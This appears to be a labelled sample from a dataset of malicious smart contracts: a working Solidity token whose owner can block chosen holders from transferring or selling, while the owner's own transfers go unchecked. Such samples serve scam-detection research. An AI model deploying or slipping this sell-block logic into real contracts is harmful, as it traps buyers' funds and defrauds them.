// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 일반 보유자는 canSend가 true여야 전송할 수 있지만 소유자는 검사에서 제외됩니다. 소유자가 특정 사용자의 판매만 막을 수 있는 비대칭 제한입니다.
pragma solidity ^0.8.20;

contract SelectiveSellBlock {
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public canSend;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function setPermission(address user, bool allowed) external onlyOwner {
        canSend[user] = allowed;
    }

    function transfer(address to, uint256 amount) external {
        if (msg.sender != owner) require(canSend[msg.sender], "blocked");
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}
